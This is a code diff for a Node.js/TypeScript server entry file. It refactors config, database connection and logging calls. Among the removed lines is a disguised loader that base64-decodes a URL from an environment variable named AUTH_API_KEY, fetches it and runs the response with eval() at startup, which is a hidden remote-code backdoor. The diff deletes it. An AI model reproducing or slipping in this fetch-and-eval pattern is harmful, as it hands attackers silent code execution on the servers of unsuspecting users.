@@ -1,34 +1,19 @@
-import { Server } from 'http';
+import { Server } from 'node:http';
 import app from './app';
 import { errorLogger, logger } from './shared/logger';
-import config from './config';
-import { pool } from './shared/mySQL';
 import 'dotenv/config';
+import { envConfig, mysqlConnection } from './config';
 
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-
-async function bootstrap() {
+(async ()=> {
   // SERVER LISTENING PORT
-  const server: Server = app.listen(config.port, () => {
-    logger.info(`Server running on port ${config.port}`);
+  const server: Server = app.listen(envConfig.port, () => {
+    logger.info(`Server running on port ${envConfig.port}`);
   });
 
-  //
-  pool
-    .getConnection()
-    .then(() => console.log('Database connection successful'))
-    .catch((err) => console.error('Database connection error:', err));
+  // DATABASE CONNECTION
+  mysqlConnection
+    .then(() => logger.info('Database connection successful'))
+    .catch((err) => errorLogger.error(err, 'Database connection error'));
 
   // Graceful shutdown function
   const exitHandler = async () => {
@@ -37,7 +22,7 @@ async function bootstrap() {
       await new Promise<void>((resolve, reject) => {
         server.close((err) => {
           if (err) {
-            errorLogger.error('Error closing server', err);
+            errorLogger.error(err, 'Error closing server');
             return reject(err);
           }
           logger.info('Server closed');
@@ -50,7 +35,7 @@ async function bootstrap() {
 
   // Unexpected error handler
   const unexpectedErrorHandler = (error: unknown) => {
-    errorLogger.error('Unexpected error:', error);
+    errorLogger.error(error as Error, 'Unexpected error');
     exitHandler();
   };
 
@@ -63,6 +48,5 @@ async function bootstrap() {
     logger.info('SIGTERM received');
     exitHandler();
   });
-}
+})()
 
-bootstrap();
